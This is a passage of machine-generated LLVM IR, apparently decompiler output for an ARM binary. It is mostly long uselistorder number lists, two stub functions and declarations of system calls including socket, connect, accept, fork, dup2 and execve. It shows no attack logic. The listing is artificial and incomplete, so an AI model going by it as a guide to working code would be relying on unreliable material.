488, 489, 723, 514, 722, 721, 720, 719, 718, 717, 847, 848, 490, 491, 732, 731, 730, 515, 729, 728, 727, 726, 725, 724, 851, 386, 427, 492, 493, 737, 736, 735, 734, 733, 232, 230, 231, 739, 738, 439, 856, 355, 356, 857, 858, 859, 743, 742, 741, 740, 860, 744, 861, 745, 862, 747, 746, 748, 863, 749, 989, 990, 494, 991, 992, 993, 495, 362, 994, 496, 995, 497, 756, 755, 754, 753, 752, 751, 750, 188, 996, 498, 997, 414, 410, 998, 757, 499, 1068, 500, 1069, 501, 502, 765, 764, 763, 762, 761, 760, 759, 758, 1125, 1126, 1127, 766, 768, 767, 415, 1132, 411, 999, 9, 1000, 769, 772, 771, 770, 441, 836, 837, 440, 838, 839, 442, 443, 840, 841, 773, 774, 775, 351, 350, 349, 516 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_15014() local_unnamed_addr {
dec_label_pc_15014:
  %v5_15018 = load i32, i32* @r0, align 4
  ret i32 %v5_15018

; uselistorder directives
  uselistorder i32* @r0, { 9, 38, 39, 194, 195, 196, 197, 36, 138, 139, 140, 141, 142, 145, 143, 144, 15, 59, 60, 61, 62, 63, 64, 65, 146, 147, 8, 236, 237, 198, 199, 200, 108, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 73, 74, 75, 76, 20, 33, 238, 42, 201, 202, 203, 204, 205, 206, 207, 208, 16, 209, 210, 211, 37, 47, 28, 277, 278, 279, 48, 280, 27, 49, 50, 281, 282, 55, 56, 57, 58, 25, 10, 21, 22, 51, 283, 284, 128, 23, 66, 67, 68, 11, 120, 121, 122, 123, 124, 125, 126, 274, 275, 43, 30, 240, 31, 239, 77, 52, 78, 17, 241, 177, 178, 179, 180, 181, 182, 183, 184, 18, 3, 19, 44, 212, 213, 214, 215, 270, 32, 53, 216, 14, 185, 186, 243, 244, 245, 246, 247, 248, 41, 249, 250, 251, 252, 79, 187, 188, 253, 109, 217, 218, 219, 4, 35, 220, 221, 5, 7, 0, 1, 222, 223, 6, 224, 225, 226, 24, 227, 228, 229, 2, 230, 231, 69, 242, 70, 71, 72, 285, 286, 254, 255, 256, 257, 258, 259, 260, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 232, 233, 34, 261, 262, 263, 264, 265, 266, 80, 26, 267, 40, 276, 29, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 127, 129, 130, 131, 132, 133, 134, 135, 136, 137, 189, 190, 191, 192, 268, 269, 271, 273, 272, 193, 234, 235, 13, 12, 45, 46, 54 }
}

define i32 @function_1501c() local_unnamed_addr {
entry:
  %v3_15020 = load i32, i32* @r4, align 4
  %v0_15028 = call i32 @function_80b0()
  call void @__pseudo_branch(i32 %v3_15020)
  ret i32 %v0_15028

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 0, 14, 6, 7, 8, 9, 19, 20, 16, 17, 18, 2, 21, 10, 3, 11, 5, 12, 13, 4, 1, 15 }
  uselistorder i32 0, { 736, 737, 738, 739, 740, 106, 741, 156, 742, 743, 744, 745, 746, 747, 748, 157, 444, 456, 445, 446, 749, 750, 751, 752, 753, 754, 755, 756, 757, 107, 758, 759, 760, 761, 762, 158, 447, 457, 448, 449, 763, 458, 602, 38, 83, 603, 604, 605, 606, 607, 608, 617, 618, 609, 610, 611, 612, 613, 614, 615, 616, 619, 0, 620, 621, 622, 450, 989, 764, 765, 634, 289, 290, 625, 626, 159, 627, 628, 630, 629, 631, 632, 256, 633, 151, 152, 153, 635, 623, 624, 68, 69, 636, 638, 639, 637, 640, 641, 642, 643, 98, 644, 645, 99, 646, 100, 647, 101, 648, 162, 468, 160, 469, 470, 471, 161, 472, 84, 85, 473, 163, 474, 291, 24, 292, 475, 476, 257, 164, 293, 294, 477, 165, 649, 650, 651, 653, 166, 652, 227, 295, 654, 296, 39, 40, 41, 42, 123, 124, 167, 168, 655, 125, 656, 264, 263, 262, 95, 43, 486, 657, 658, 487, 260, 766, 169, 990, 991, 992, 993, 994, 767, 768, 25, 769, 770, 126, 771, 772, 170, 995, 996, 997, 1, 998, 999, 773, 171, 774, 775, 776, 777, 778, 779, 659, 534, 172, 2, 3, 559, 660, 265, 661, 662, 663, 297, 664, 665, 666, 667, 668, 669, 670, 671, 44, 673, 672, 86, 674, 675, 298, 690, 676, 677, 678, 5, 4, 268, 254, 255, 261, 679, 680, 682, 683, 127, 222, 685, 299, 686, 687, 6, 688, 689, 691, 300, 269, 684, 681, 692, 693, 173, 694, 695, 7, 696, 697, 698, 699, 175, 174, 700, 176, 488, 489, 8, 459, 780, 45, 128, 781, 782, 228, 9, 460, 230, 783, 46, 129, 784, 785, 229, 1092, 1093, 1094, 1095, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1096, 1097, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 26, 1114, 1115, 1116, 1117, 27, 1118, 1119, 28, 1120, 1121, 29, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1136, 1137, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 30, 1154, 1155, 1156, 1157, 31, 1158, 1159, 1160, 1161, 32, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1000, 1001, 1002, 301, 302, 1003, 1004, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 177, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 33, 817, 818, 819, 820, 821, 822, 823, 130, 97, 824, 825, 178, 179, 826, 827, 828, 829, 180, 830, 831, 832, 833, 834, 835, 836, 837, 838, 34, 839, 840, 841, 842, 843, 844, 845, 258, 846, 47, 181, 847, 182, 303, 848, 849, 850, 851, 852, 853, 35, 854, 855, 856, 857, 858, 859, 860, 304, 861, 862, 863, 864, 865, 866, 867, 36, 868, 121, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 461, 880, 881, 882, 883, 884, 885, 887, 886, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 131, 1005, 1006, 10, 1008, 231, 11, 270, 903, 232, 904, 905, 132, 906, 535, 1174, 1009, 1010, 1011, 1012, 536, 1175, 108, 1176, 560, 1177, 1178, 1179, 1180, 537, 538, 1181, 1182, 1183, 1184, 1185, 183, 1186, 104, 1187, 102, 103, 1188, 1189, 1190, 305, 306, 307, 1194, 308, 1200, 1205, 443, 233, 1206, 309, 1204, 310, 311, 12, 1191, 1192, 184, 561, 266, 562, 314, 272, 271, 563, 564, 565, 566, 313, 567, 568, 312, 569, 539, 185, 540, 1193, 579, 580, 581, 582, 583, 584, 187, 133, 585, 105, 186, 188, 315, 478, 134, 479, 135, 480, 189, 570, 571, 572, 573, 13, 1084, 1085, 317, 1195, 318, 273, 1196, 1197, 1198, 1199, 316, 1015, 1017, 1018, 48, 234, 1019, 1016, 1013, 1014, 14, 490, 493, 491, 492, 235, 15, 1022, 1020, 1021, 236, 190, 494, 495, 496, 497, 1023, 1024, 319, 16, 1025, 191, 1026, 1027, 1028, 1029, 1030, 1031, 907, 523, 441, 586, 442, 908, 909, 701, 910, 911, 702, 703, 192, 704, 708, 709, 710, 711, 320, 712, 713, 714, 597, 598, 195, 599, 600, 136, 137, 194, 193, 1201, 196, 17, 197, 198, 912, 913, 200, 914, 321, 199, 915, 87, 916, 917, 237, 18, 918, 705, 706, 707, 716, 141, 70, 715, 717, 718, 719, 720, 138, 139, 140, 721, 118, 119, 1081, 88, 89, 90, 1082, 1083, 19, 1207, 1208, 91, 201, 919, 920, 921, 922, 923, 722, 723, 724, 725, 202, 1032, 462, 1033, 122, 142, 1034, 1035, 1039, 1036, 1037, 1038, 238, 1040, 287, 1042, 1041, 239, 1043, 498, 499, 726, 1044, 1045, 541, 542, 924, 925, 926, 927, 928, 143, 929, 930, 931, 932, 933, 203, 934, 936, 937, 935, 938, 144, 939, 940, 204, 941, 205, 259, 322, 942, 943, 206, 207, 944, 945, 946, 947, 948, 949, 274, 950, 951, 323, 952, 275, 954, 212, 956, 209, 210, 953, 208, 955, 957, 959, 146, 960, 961, 213, 71, 72, 962, 963, 145, 324, 964, 965, 214, 325, 966, 967, 211, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 326, 979, 109, 76, 978, 980, 981, 982, 20, 481, 215, 482, 120, 73, 96, 958, 240, 483, 21, 242, 216, 485, 484, 241, 276, 1203, 1046, 1047, 1048, 74, 1049, 1050, 217, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 277, 278, 219, 218, 543, 243, 544, 545, 154, 253, 546, 547, 279, 548, 549, 327, 551, 552, 553, 554, 155, 983, 328, 1064, 1065, 1066, 1067, 1069, 1070, 451, 1007, 550, 587, 984, 1090, 1202, 500, 1091, 501, 502, 503, 504, 505, 506, 507, 508, 509, 985, 1068, 22, 1071, 147, 1072, 1073, 224, 223, 452, 110, 111, 112, 113, 463, 453, 50, 49, 148, 1074, 1075, 1076, 1077, 1079, 1078, 23, 1086, 1087, 226, 225, 454, 114, 115, 116, 117, 464, 455, 52, 51, 37, 75, 1088, 465, 329, 334, 510, 511, 512, 53, 92, 54, 55, 56, 244, 335, 513, 57, 77, 332, 333, 514, 58, 78, 336, 337, 331, 245, 338, 330, 339, 515, 516, 517, 519, 252, 518, 520, 521, 342, 343, 340, 341, 522, 348, 344, 345, 346, 524, 347, 349, 525, 526, 527, 350, 528, 529, 530, 351, 149, 531, 59, 249, 248, 532, 533, 60, 247, 246, 352, 280, 353, 574, 575, 281, 354, 355, 576, 282, 250, 577, 578, 283, 588, 356, 357, 589, 284, 590, 591, 592, 593, 594, 595, 358, 596, 61, 79, 80, 62, 63, 359, 360, 601, 361, 363, 727, 94, 364, 728, 729, 93, 365, 366, 730, 367, 731, 362, 732, 368, 369, 370, 733, 150, 64, 734, 220, 372, 373, 374, 986, 375, 987, 376, 377, 371, 251, 378, 988, 285, 267, 286, 379, 380, 65, 82, 66, 81, 1080, 381, 221, 67, 735, 555, 556, 288, 557, 558, 1089, 466, 467, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223 }
  uselistorder i32* @r4, { 50, 560, 197, 5, 198, 199, 4, 200, 201, 202, 11, 203, 10, 204, 205, 206, 444, 445, 207, 210, 213, 214, 215, 216, 217, 208, 209, 211, 212, 12, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 233, 232, 234, 235, 236, 237, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 13, 15, 64, 14, 65, 66, 67, 68, 238, 239, 240, 241, 2, 242, 243, 244, 245, 246, 247, 248, 251, 249, 250, 42, 252, 253, 313, 314, 315, 446, 447, 16, 448, 449, 450, 451, 452, 453, 17, 454, 455, 456, 457, 458, 459, 460, 316, 317, 461, 462, 463, 464, 465, 466, 467, 468, 469, 318, 319, 320, 321, 254, 255, 137, 138, 564, 565, 568, 569, 256, 258, 257, 260, 259, 7, 265, 261, 266, 6, 267, 268, 269, 270, 271, 272, 18, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 94, 95, 96, 97, 98, 99, 322, 323, 324, 325, 326, 327, 328, 570, 571, 329, 330, 331, 332, 333, 334, 335, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 470, 471, 472, 473, 474, 475, 476, 19, 477, 478, 336, 337, 338, 339, 340, 341, 342, 20, 343, 344, 345, 346, 21, 347, 348, 349, 22, 350, 351, 352, 353, 354, 355, 8, 356, 0, 357, 358, 23, 479, 480, 481, 484, 485, 139, 140, 141, 142, 143, 359, 1, 144, 145, 588, 589, 9, 486, 487, 146, 147, 166, 590, 591, 592, 593, 594, 595, 148, 149, 150, 596, 597, 24, 598, 599, 600, 601, 613, 614, 615, 616, 46, 624, 43, 608, 609, 610, 611, 612, 602, 603, 604, 167, 168, 169, 170, 171, 172, 173, 174, 605, 606, 185, 186, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 175, 176, 177, 178, 179, 555, 556, 180, 181, 182, 557, 558, 559, 607, 488, 489, 490, 25, 100, 101, 102, 26, 103, 27, 104, 105, 491, 28, 29, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 360, 361, 129, 130, 187, 188, 362, 363, 364, 365, 285, 286, 366, 367, 368, 369, 287, 288, 289, 290, 291, 30, 292, 293, 294, 295, 296, 297, 617, 618, 619, 262, 263, 264, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 298, 299, 300, 301, 31, 302, 303, 304, 505, 506, 507, 508, 509, 510, 511, 512, 513, 516, 517, 518, 519, 106, 32, 107, 108, 305, 306, 307, 308, 309, 520, 33, 521, 522, 151, 152, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 404, 403, 405, 406, 407, 408, 409, 410, 411, 34, 412, 413, 414, 420, 421, 422, 423, 3, 424, 425, 426, 427, 428, 429, 430, 35, 431, 36, 432, 433, 434, 435, 80, 81, 82, 415, 417, 416, 418, 419, 514, 515, 83, 47, 84, 85, 86, 87, 88, 89, 90, 91, 44, 92, 93, 620, 621, 622, 623, 523, 524, 525, 526, 527, 528, 529, 37, 530, 38, 531, 532, 533, 534, 535, 536, 537, 48, 153, 45, 154, 155, 156, 157, 158, 159, 160, 161, 436, 437, 438, 439, 538, 539, 540, 541, 542, 543, 544, 39, 40, 547, 548, 482, 483, 189, 190, 440, 441, 562, 563, 109, 110, 566, 567, 111, 112, 113, 41, 114, 115, 116, 117, 442, 443, 545, 546, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 131, 132, 133, 134, 135, 136, 183, 184, 191, 192, 193, 194, 195, 196, 310, 311, 312, 549, 550, 551, 552, 553, 554, 162, 163, 164, 165, 49, 561 }
}

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i8* @getcwd(i8*, i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @dup2(i32, i32) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @wait4(i32, i32, i32, %rusage*) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
